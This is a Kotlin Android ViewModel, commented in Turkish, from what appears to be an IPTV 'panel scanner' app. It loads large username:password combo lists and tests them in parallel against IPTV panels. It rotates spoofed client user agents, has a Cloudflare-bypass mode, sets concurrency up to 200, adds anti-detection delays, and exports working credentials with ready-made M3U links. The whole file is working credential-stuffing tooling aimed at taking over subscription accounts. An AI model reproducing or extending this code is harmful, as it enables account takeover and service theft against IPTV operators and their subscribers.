package com.alibaba.feature.panelscan

import androidx.lifecycle.ViewModel
import androidx.lifecycle.viewModelScope
import com.alibaba.domain.model.*
import com.alibaba.domain.service.PanelScanner
import dagger.hilt.android.lifecycle.HiltViewModel
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.async
import kotlinx.coroutines.awaitAll
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.flow.update
import kotlinx.coroutines.launch
import kotlinx.coroutines.sync.Semaphore
import kotlinx.coroutines.sync.withPermit
import kotlinx.coroutines.withContext
import java.io.InputStream
import javax.inject.Inject

/**
 * 🔥 ULTRA PANEL SCANNER STATE
 * Attack modları ve gelişmiş tarama özellikleri
 */
data class PanelScanState(
    val comboText: String = "",
    val customPanelUrl: String = "",
    val selectedPanels: List<PanelInfo> = emptyList(),
    val useEmbeddedPanels: Boolean = false,
    val scanning: Boolean = false,
    val progress: ScanProgress? = null,
    val results: List<PanelScanResult> = emptyList(),
    val errorMessage: String? = null,
    val comboLineCount: Int = 0,
    val showSaveDialog: Boolean = false,
    val savedFilePath: String? = null,
    // 🔥 Yeni özellikler
    val attackMode: AttackModeOption = AttackModeOption.ROTATION,
    val scanSpeed: ScanSpeed = ScanSpeed.FAST,
    val totalScanned: Int = 0,
    val scanStartTime: Long = 0,
    val estimatedTimeRemaining: String = "",
    // 📂 Dosya yükleme durumu
    val isLoadingFile: Boolean = false,
    val loadingProgress: Float = 0f,
    val loadingMessage: String = ""
)

/**
 * Attack modları - den.py'den alınan
 */
enum class AttackModeOption(val displayName: String, val description: String) {
    ROTATION("🔄 Rotation", "Her istekte farklı mod kullanır - En güvenli"),
    RANDOM("🎲 Random", "Rastgele User-Agent kullanır"),
    TIVIMATE("📺 TiviMate", "TiviMate uygulaması gibi davranır"),
    OTT_NAVIGATOR("📡 OTT Navigator", "OTT Navigator uygulaması gibi davranır"),
    KODI("🎬 Kodi", "Kodi media player gibi davranır"),
    XCIPTV("📱 XCIPTV", "XCIPTV uygulaması gibi davranır"),
    STB_MAG("📦 STB/MAG", "MAG set-top box gibi davranır"),
    SMARTERS_PRO("💫 Smarters Pro", "IPTV Smarters Pro gibi davranır"),
    APPLE_TV("🍎 Apple TV", "Apple TV gibi davranır"),
    CLOUDBURST("☁️ Cloudburst", "Cloudflare bypass modu")
}

/**
 * Tarama hızı seçenekleri
 */
enum class ScanSpeed(val displayName: String, val delayMs: Long, val concurrency: Int) {
    SLOW("🐢 Yavaş (Güvenli)", 500L, 10),
    NORMAL("🚶 Normal", 200L, 25),
    FAST("🏃 Hızlı", 100L, 50),
    ULTRA("🚀 Ultra Hızlı", 50L, 100),
    AGGRESSIVE("⚡ Saldırgan", 0L, 200)
}

data class ScanProgress(
    val current: Int,
    val total: Int,
    val currentAccount: String = "",
    val validCount: Int = 0,
    val invalidCount: Int = 0,
    val errorCount: Int = 0,
    val speedPerSecond: Float = 0f
)

@HiltViewModel
class PanelScanViewModel @Inject constructor(
    private val panelScanner: PanelScanner
) : ViewModel() {

    private val _state = MutableStateFlow(PanelScanState())
    val state: StateFlow<PanelScanState> = _state.asStateFlow()
    
    private var scanJob: kotlinx.coroutines.Job? = null

    fun setComboText(text: String) {
        val lineCount = text.lines().count { it.contains(":") }
        _state.update { it.copy(comboText = text, comboLineCount = lineCount) }
    }
    
    // Hesapları bellekte tutmak yerine ayrı listede tut
    private var loadedAccounts: MutableList<String> = mutableListOf()
    
    /**
     * 🔥 ULTRA OPTİMİZE Combo Yükleme - 1GB+ Dosya Desteği
     * 
     * Yaratıcı çözüm: Dosyayı CHUNK'lar halinde okur, UI'ı bloklamaz
     * - Her 5000 satırda bir UI güncellenir
     * - Bellek taşmasını önlemek için StringBuilder kullanılmaz
     * - Progress göstergesi ile kullanıcı bilgilendirilir
     */
    fun loadComboFromStream(inputStream: InputStream, fileSize: Long = 0, onComplete: (Int) -> Unit = {}) {
        viewModelScope.launch(Dispatchers.IO) {
            try {
                // Loading başlat
                _state.update { 
                    it.copy(
                        isLoadingFile = true,
                        loadingProgress = 0f,
                        loadingMessage = "📂 Dosya açılıyor...",
                        errorMessage = null
                    ) 
                }
                
                loadedAccounts.clear()
                var lineCount = 0
                var bytesRead = 0L
                val buffer = CharArray(8192) // 8KB buffer
                
                val reader = inputStream.bufferedReader()
                val lineBuilder = StringBuilder()
                
                // Chunk-based okuma - UI'ı bloklamaz
                while (true) {
                    val charsRead = reader.read(buffer)
                    if (charsRead == -1) break
                    
                    bytesRead += charsRead * 2 // UTF-16
                    
                    // Buffer'ı işle
                    for (i in 0 until charsRead) {
                        val char = buffer[i]
                        if (char == '\n' || char == '\r') {
                            if (lineBuilder.isNotEmpty()) {
                                val line = lineBuilder.toString()
                                if (line.contains(":") && !line.startsWith("#")) {
                                    loadedAccounts.add(line)
                                    lineCount++
                                }
                                lineBuilder.clear()
                            }
                        } else {
                            lineBuilder.append(char)
                        }
                    }
                    
                    // Her 5000 satırda bir UI güncelle (performans için)
                    if (lineCount % 5000 == 0 && lineCount > 0) {
                        val progress = if (fileSize > 0) (bytesRead.toFloat() / fileSize).coerceIn(0f, 1f) else 0f
                        _state.update { 
                            it.copy(
                                loadingProgress = progress,
                                loadingMessage = "📊 $lineCount hesap bulundu...",
                                comboLineCount = lineCount
                            ) 
                        }
                        // UI'ın nefes alması için küçük bir bekleme
                        kotlinx.coroutines.yield()
                    }
                }
                
                // Son satırı işle
                if (lineBuilder.isNotEmpty()) {
                    val line = lineBuilder.toString()
                    if (line.contains(":") && !line.startsWith("#")) {
                        loadedAccounts.add(line)
                        lineCount++
                    }
                }
                
                reader.close()
                
                // Sonuçları state'e yaz - SADECE satır sayısı, tüm text değil!
                _state.update { 
                    it.copy(
                        comboText = if (lineCount <= 10000) loadedAccounts.joinToString("\n") else "[${lineCount} hesap yüklendi - bellekte tutulmadı]",
                        comboLineCount = lineCount,
                        isLoadingFile = false,
                        loadingProgress = 1f,
                        loadingMessage = "✅ $lineCount hesap yüklendi!"
                    ) 
                }
                
                onComplete(lineCount)
                
            } catch (e: Exception) {
                _state.update { 
                    it.copy(
                        isLoadingFile = false,
                        errorMessage = "❌ Dosya okuma hatası: ${e.message}"
                    ) 
                }
            }
        }
    }
    
    /**
     * Yüklenen hesapları al (tarama için)
     */
    fun getLoadedAccounts(): List<String> {
        return if (loadedAccounts.isNotEmpty()) {
            loadedAccounts.toList()
        } else {
            _state.value.comboText.lines().filter { it.contains(":") }
        }
    }
    
    /**
     * Attack modu değiştir
     * Seçilen mod tarama sırasında HTTP headers'a yansır
     */
    fun setAttackMode(mode: AttackModeOption) {
        _state.update { it.copy(attackMode = mode) }
    }
    
    /**
     * Tarama hızı değiştir
     */
    fun setScanSpeed(speed: ScanSpeed) {
        _state.update { it.copy(scanSpeed = speed) }
    }
    
    fun setCustomPanelUrl(url: String) {
        _state.update { it.copy(customPanelUrl = url) }
    }
    
    fun parseAndAddCustomPanel() {
        val url = _state.value.customPanelUrl.trim()
        if (url.isBlank()) return
        
        try {
            // URL'den host ve port çıkar
            val cleanUrl = url.removePrefix("http://").removePrefix("https://")
            val parts = cleanUrl.split(":")
            val host = parts[0].split("/")[0]
            val port = if (parts.size > 1) {
                parts[1].split("/")[0].toIntOrNull() ?: 80
            } else 80
            
            val panel = PanelInfo(host, port, isEmbedded = false)
            _state.update { 
                it.copy(
                    selectedPanels = it.selectedPanels + panel,
                    customPanelUrl = ""  // Temizle
                ) 
            }
        } catch (e: Exception) {
            _state.update { it.copy(errorMessage = "Geçersiz panel URL: $url") }
        }
    }
    
    fun clearCustomPanels() {
        _state.update { it.copy(selectedPanels = emptyList()) }
    }

    fun toggleEmbeddedPanels() {
        _state.update { it.copy(useEmbeddedPanels = !it.useEmbeddedPanels) }
    }

    fun addCustomPanel(host: String, port: Int) {
        val panel = PanelInfo(host, port, isEmbedded = false)
        _state.update { 
            it.copy(selectedPanels = it.selectedPanels + panel) 
        }
    }

    fun removePanel(panel: PanelInfo) {
        _state.update { 
            it.copy(selectedPanels = it.selectedPanels.filter { p -> p != panel }) 
        }
    }
    
    fun stopScan() {
        scanJob?.cancel()
        _state.update { 
            it.copy(
                scanning = false,
                showSaveDialog = it.results.isNotEmpty()  // Sonuç varsa kaydetme dialogu göster
            ) 
        }
    }
    
    fun dismissSaveDialog() {
        _state.update { it.copy(showSaveDialog = false) }
    }
    
    fun getResultsAsText(): String {
        val results = _state.value.results
        val sb = StringBuilder()
        sb.appendLine("=== IPTV Panel Tarama Sonuçları ===")
        sb.appendLine("Tarih: ${java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.getDefault()).format(java.util.Date())}")
        sb.appendLine("Bulunan Hesap Sayısı: ${results.size}")
        sb.appendLine()
        
        results.forEach { result ->
            sb.appendLine("─".repeat(50))
            sb.appendLine("Kullanıcı: ${result.account.username}")
            sb.appendLine("Şifre: ${result.account.password}")
            sb.appendLine("Panel: ${result.panel.fullAddress}")
            result.userInfo?.let { info ->
                sb.appendLine("Bitiş: ${info.expDate ?: "Sınırsız"}")
                sb.appendLine("Bağlantı: ${info.activeCons}/${info.maxConnections}")
                sb.appendLine("Durum: ${info.status}")
            }
            sb.appendLine("M3U: http://${result.panel.fullAddress}/get.php?username=${result.account.username}&password=${result.account.password}&type=m3u_plus")
            sb.appendLine()
        }
        
        return sb.toString()
    }

    /**
     * 🔥 ULTRA HIZLI PARALEL TARAMA
     * Seçilen attack modu ve hız ayarlarına göre tarama yapar
     */
    fun startScan() {
        val currentState = _state.value
        
        if (currentState.comboText.isBlank()) {
            _state.update { it.copy(errorMessage = "Lütfen combo listesi girin") }
            return
        }
        
        val hasCustomPanels = currentState.selectedPanels.isNotEmpty()
        val useEmbedded = currentState.useEmbeddedPanels
        
        if (!hasCustomPanels && !useEmbedded) {
            _state.update { it.copy(errorMessage = "Lütfen panel URL'si girin veya gömülü panelleri aktif edin") }
            return
        }

        scanJob = viewModelScope.launch {
            val startTime = System.currentTimeMillis()
            
            _state.update { 
                it.copy(
                    scanning = true, 
                    errorMessage = null,
                    results = emptyList(),
                    progress = null,
                    scanStartTime = startTime
                ) 
            }

            try {
                // Parse combo file
                val accounts = panelScanner.parseComboFile(currentState.comboText)
                
                if (accounts.isEmpty()) {
                    _state.update { 
                        it.copy(
                            scanning = false,
                            errorMessage = "Geçerli hesap bulunamadı. Format: kullanici:sifre"
                        ) 
                    }
                    return@launch
                }

                // Get panels to scan
                val panelsToScan = mutableListOf<PanelInfo>()
                
                if (currentState.useEmbeddedPanels) {
                    panelsToScan.addAll(
                        EmbeddedPanels.panels.map { 
                            PanelInfo(it.host, it.port, isEmbedded = true) 
                        }
                    )
                }
                
                panelsToScan.addAll(currentState.selectedPanels)

                if (panelsToScan.isEmpty()) {
                    _state.update { 
                        it.copy(
                            scanning = false,
                            errorMessage = "Lütfen en az bir panel seçin"
                        ) 
                    }
                    return@launch
                }

                val totalScans = accounts.size * panelsToScan.size
                val results = mutableListOf<PanelScanResult>()
                var validCount = 0
                var invalidCount = 0
                var errorCount = 0
                val delayMs = currentState.scanSpeed.delayMs

                // 🔥 PARALEL TARAMA - Çok daha hızlı
                withContext(Dispatchers.IO) {
                    val semaphore = Semaphore(currentState.scanSpeed.concurrency)
                    var currentScan = 0
                    
                    val jobs = accounts.flatMap { account ->
                        panelsToScan.map { panel ->
                            async {
                                semaphore.withPermit {
                                    try {
                                        val result = panelScanner.scanAccount(account, panel)
                                        
                                        synchronized(results) {
                                            currentScan++
                                            
                                            when (result.status) {
                                                is ScanStatus.Valid -> {
                                                    validCount++
                                                    results.add(result)
                                                    // Hit bulunduğunda hemen UI'ı güncelle
                                                    _state.update { s -> s.copy(results = results.toList()) }
                                                }
                                                is ScanStatus.Invalid -> invalidCount++
                                                is ScanStatus.Error -> errorCount++
                                                is ScanStatus.Banned -> errorCount++
                                                else -> {}
                                            }
                                            
                                            // Her 50 taramada bir progress güncelle (performans için)
                                            if (currentScan % 50 == 0 || currentScan == totalScans) {
                                                val elapsed = (System.currentTimeMillis() - startTime) / 1000f
                                                val speed = if (elapsed > 0) currentScan / elapsed else 0f
                                                
                                                _state.update { s -> 
                                                    s.copy(
                                                        progress = ScanProgress(
                                                            current = currentScan,
                                                            total = totalScans,
                                                            currentAccount = "${account.username}:***",
                                                            validCount = validCount,
                                                            invalidCount = invalidCount,
                                                            errorCount = errorCount,
                                                            speedPerSecond = speed
                                                        ),
                                                        totalScanned = currentScan
                                                    ) 
                                                }
                                            }
                                        }
                                        
                                        // Anti-detection delay
                                        if (delayMs > 0) {
                                            delay(delayMs)
                                        }
                                        
                                        result
                                    } catch (e: Exception) {
                                        synchronized(results) { errorCount++ }
                                        null
                                    }
                                }
                            }
                        }
                    }
                    
                    jobs.awaitAll()
                }

                // Final update
                val totalTime = (System.currentTimeMillis() - startTime) / 1000f
                _state.update { 
                    it.copy(
                        scanning = false,
                        showSaveDialog = results.isNotEmpty(),
                        progress = ScanProgress(
                            current = totalScans,
                            total = totalScans,
                            validCount = validCount,
                            invalidCount = invalidCount,
                            errorCount = errorCount,
                            speedPerSecond = if (totalTime > 0) totalScans / totalTime else 0f
                        )
                    ) 
                }

            } catch (e: kotlinx.coroutines.CancellationException) {
                // Kullanıcı durdurdu
                _state.update { 
                    it.copy(
                        scanning = false,
                        showSaveDialog = _state.value.results.isNotEmpty()
                    ) 
                }
            } catch (e: Exception) {
                _state.update { 
                    it.copy(
                        scanning = false,
                        errorMessage = "Hata: ${e.message}"
                    ) 
                }
            }
        }
    }

    fun clearResults() {
        _state.update { 
            it.copy(
                results = emptyList(),
                progress = null,
                errorMessage = null
            ) 
        }
    }

    fun clearError() {
        _state.update { it.copy(errorMessage = null) }
    }
}
